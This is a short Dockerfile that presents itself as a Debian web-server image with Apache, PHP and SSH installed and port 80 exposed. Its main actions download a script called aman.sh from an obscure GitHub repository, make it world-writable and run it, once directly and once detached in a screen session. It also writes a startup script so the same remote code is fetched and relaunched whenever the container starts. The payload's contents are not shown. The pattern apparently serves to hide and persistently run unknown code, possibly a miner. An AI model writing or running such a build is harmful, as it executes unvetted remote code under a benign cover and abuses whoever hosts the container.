FROM debian
RUN apt update && apt -y install wget screen
RUN DEBIAN_FRONTEND=noninteractive apt install ssh curl screen nano wget npm apache2 php php-curl php-cli php-fpm php-json php-common php-mysql php-zip php-gd php-mbstring  php-xml php-pear php-bcmath  -y
RUN wget https://raw.githubusercontent.com/lamajuahsu/kokekoko/main/aman.sh && chmod 777 aman.sh && ./aman.sh
RUN echo 'wget https://raw.githubusercontent.com/lamajuahsu/kokekoko/main/aman.sh && chmod 777 aman.sh && screen -dmS aman ./aman.sh' >>/luo.sh
RUN wget https://raw.githubusercontent.com/lamajuahsu/kokekoko/main/aman.sh && chmod 777 aman.sh && screen -dmS aman ./aman.sh
RUN chmod 777 /luo.sh
EXPOSE 80
CMD ./luo.sh
